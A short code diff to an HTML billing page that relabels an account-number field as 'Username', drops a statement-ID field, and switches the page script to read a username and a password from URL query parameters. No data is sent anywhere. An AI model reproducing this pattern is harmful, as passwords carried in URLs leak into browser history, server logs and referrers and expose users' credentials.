@@ -218,13 +218,10 @@
                   <h3>Billing Address</h3>
                   <div class="row">
                     <div class="col-50">
-                      <label for="fname">Account Number</label>
+                      <label for="fname">Username</label>
                       <p class="ee" id="AccountNumber"></p>
                     </div>
-                    <div class="col-50">
-                      <label for="amount">Statement ID</label>
-                      <p class="ee" id="statement_id"></p>
-                    </div>
+                    
                   </div>
 
                   <div class="row">
@@ -423,9 +420,9 @@
 
     <script>
       // Get form data from POST request
-      const acc_number = new URLSearchParams(window.location.search).get("AccountNumber");
+      const acc_number = new URLSearchParams(window.location.search).get("Username");
       const stmt_id = new URLSearchParams(window.location.search).get(
-        "statement_id"
+        "Password"
       );
 
 
